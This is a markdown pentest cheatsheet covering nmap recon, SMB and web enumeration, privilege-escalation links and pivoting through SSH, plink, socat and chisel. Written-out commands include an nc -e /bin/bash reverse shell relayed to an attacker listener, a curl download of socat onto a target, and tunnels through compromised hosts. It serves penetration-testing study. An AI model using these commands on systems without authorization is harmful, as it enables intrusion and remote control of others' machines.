# Pentest cheatsheet

## Recon

First fast recon
`nmap -oN -T5 first_fast_scan <IP>`

More precise scan on top 1000 ports
`nmap -A -T5 -oN top1000_agressive_scan <IP>`

Exhaustive scan (agressive and all ports)
`nmap -v -sS -A -Pn -T5 -p- -oN all_ports_agressive_scan <IP>`

Upd scan
`nmap -v -sU -T5 -oN udp_scna <IP>`

What to note
*    Services running
*    Services version
*    OS version
Search these with [searchsploit](https://www.exploit-db.com/searchsploit) or directly on [exploit database](https://www.exploit-db.com/).
If a RCE or intresting vuln is found check on [metasploit](https://www.metasploit.com/) if a module is available. Also search on github for potential PoCs.

If ports 21 is open try to connect to FTP (use [ncftp](https://linux.die.net/man/1/ncftp)) as `Anonymous` user.

If ports 139 and 445 are open, try to enumerate SMB.
`smbclient -L <IP>`

Try to connect to the availables Shares
`smbclient -U=Anonymous -N //<IP>/share`

You can also try a nmap script
`nmap -p445 -sV --script smb-enum-services <IP>`


## Web

**Examine traffic through burp**

Edit DNS local config
Linux `/etc/hosts`
Windows `C:\Windows\System32\drivers\etc\hosts`

Try tu put null bytes in the url to get 404 and see server error to get server type/version.


### Dirbusting
```shell=
gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://<IP>/
gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://<IP>/
```
add -x for extensions

### Subdomains enumeration

If 443 is open or an SSL port is open navigate through the cert and look for subdomains.
Or use this command
```shell=
echo | openssl s_client -connect <IP>:443  | openssl x509 -noout -text | grep DNS | sed 's/,/\n/g'
```

Then put the subdomains in a hosts file and request them with `curl`:
```shell=
curl -vv 'Host: <domain>' <IP>
```

This msf module `auxiliary/scanner/http/vhost_scanner` can be useful for bruteforcing these.

## Reverse shells

[Craft reverse shells](revshells.com)

[Usefull resource for referse shells](https://delta.navisec.io/reverse-shell-reference/)

## Privesc

[Navisec's privesc documentation](https://delta.navisec.io/privilege-escalation/)

Payload all the things

[Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
[Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Linux

Exploit available binaries : https://gtfobins.github.io/


### Windows

Exploit windows native binaries : https://lolbas-project.github.io/#



## Pivoting

Resources :
*    https://tryhackme.com/room/wreath

### Linux

#### Network discovering

Local files to check
```shell=
/etc/hosts
/etc/resolv.conf
```

Commands to try
```shell=
nmcli dev show
arp -a
```

Bash one-liner full ping sweep of the network
`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`

Bash one-liner port scan
`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

Use compiled tools : https://github.com/andrew-d/static-binaries

Compiled nmap : https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip

Scan though a proxy

### Windows

#### Network discovering

Local files to check
```shell=
C:\Windows\System32\drivers\etc\hosts
```

Commands to try
```shell=
ipconfig /all
arp -a
```
Import and compile tools :

https://github.com/MuirlandOracle/C-Sharp-Port-Scan

https://github.com/MuirlandOracle/CPP-Port-Scanner


### Proxies

#### Proxychains

Create (or edit) config file `/etc/proxychains.conf` or create a local `./proxychains.conf` or `~/.proxychains/proxychains.conf` file.

Only tcp scans, specify `-Pn` to forbid icmp scans.

#### Foxyproxy

Use [foxyproxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/) for web apps.

#### SSH Port Fordwarding 

If you have an ssh access on a first server you can use it for ssh tunneling to access the service the distant network as if it was running locally.

```shell=
ssh -L <local-port>:<remote-ip>:<distant-port> <user>@<local-ip> -fN
```

#### SSH Proxy

You can also setup a ssh proxy with the `-D` option

```shell=
ssh -D <local-port> <user>@<distant-ip> -fN
```

#### Reverse ssh connection

If you have a shell on the distant machine but no ssh access, you can connect from the distant machine to your local one using a reverse connection. To do so, follow these steps :
* `ssh-gen` on the distant machine to generate a pair of rsa keys
* copy the content of the `.pub` in your local `~/ssh/authorized_keys` file
* check if the ssh service is running on your local machine with `sudo systemctl status ssh`. If it is not running, start it with `sudo systemctl start ssh`
* On your local machine type the following command `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` and then paste the public key
* Now it's time to connect back with the following command from the distant machine `ssh -R <local-port>:<distant-machine-ip>:<distant-machine-port> <local-user>@<local-ip> -i <keyfile> -fN` or `ssh -R <local-port> <local-user>@<local-ip> -i <keyfile> -fN` for newer ssh versions

#### plink.exe

[plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) is a Windows command line version of the PuTTY SSH client. Useful mostly on old windows servers as recent versions of windows have ssh built-in.

`ssh-keygen` won't work properly here, you will need to use `puttygen` to convert them into a `.ppk` file.

```shell=
puttygen <keyfile> -o keyfile.ppk
```

Then transfer the `.ppk` file to the distant windows machine and add the key to the `authorized_keys` file on your local machine.

Run this command on the distant windows server
```shell=
cmd.exe /c echo y | .\plink.exe -R <local-port>:<remote-ip>:<remote-port> <local-user>@<local-ip> -i <keyfile> -N
```

#### Socat

[Linux static binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)

[Windows static binaries](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)

Check [here](https://tryhackme.com/room/introtoshells) for encrypted shells and custom compilation.

On your local machine run `sudo python3 -m http.server 80`

Then on target `curl <local-ip>/socat -o /tmp/socat-<local-username> && chmod +x /tmp/socat-<local-username>`

And now you have a socat binary on the target.

##### Reverse shell relay

Now let's connect back to our own machine from the target.

To do that, first start a listener on your local machine `sudo nc -lvnp <local-port>`.
> Good port to use to bypass firewall are 80 or 443

Next connect with `socat` from the target : `./socat tcp-l:<relay-port> tcp:<local-ip>:<local-port> &`

Now it's time to create a reverse shell to the newly open port `relay-port` on the target. Run the following command on the target server : `nc 127.0.0.1 <relay-port> -e /bin/bash`

The problem with this method is that it opens a port on the relay server, for a more quiet method see the next section.

##### Port forwarding - Classic

Then create the port forward run the next command on your local machine : `./socat tcp-l:<relay-port>,fork,reuseaddr tcp:<target-ip>:<target-port> &`

Now the `distant-port` should now be forwarded to the relay server meanning that you can access the distant service from `relay-ip:relay-port`

##### Port forwarding - Quiet

First run this on your local machine `socat tcp-l:<local-port1> tcp-l:<local-port2>,fork,reuseaddr &`

Then run this on the relay server `./socat tcp:<local-ip>:<local-port1> tcp:<target-ip>:<target-port>,fork &`

Now the `target-port` should now be forwarded to localhost meanning that you can access the distant service from `localhost:local-port2`.

To stop the port forwarding you have to run the `jobs` command and the kill all socat processes using `kill %<job-bumber>`

> TODO : Add crypted reverse shells see [shells room](https://tryhackme.com/room/introtoshells) step 7

### Chisel

[Chisel](https://github.com/jpillora/chisel) is a tool that can be used to setup a tunneled proxy or port forward through a compromised system. Written in go, it can be compiled for any system.

If you have an ssh access you can use the following command to copy the chisel binary to the compromised server : `scp -i <keyfile> chisel user@target:/tmp/chisel-<username>`

#### Reverse SOCKS Proxy

First on your local machine run the following command : `./chisel server -p <local-port> --reverse &`

Then run this command on the proxy machine : `./chisel client <local-ip>:<local-port> R:socks &`

> Note that the port to send the data through will be different that the listener port.

#### Forward SOCKS Proxy

First run `./chisel server -p <listen-port> --socks5` on the proxy machine.

And then `./chisel client <proxy-ip>:<listen-port> <local-port>:socks` in your local machine. Here listen port is the open port on the proxy machine and local-port is the port we will use to send traffic through on our local machine.
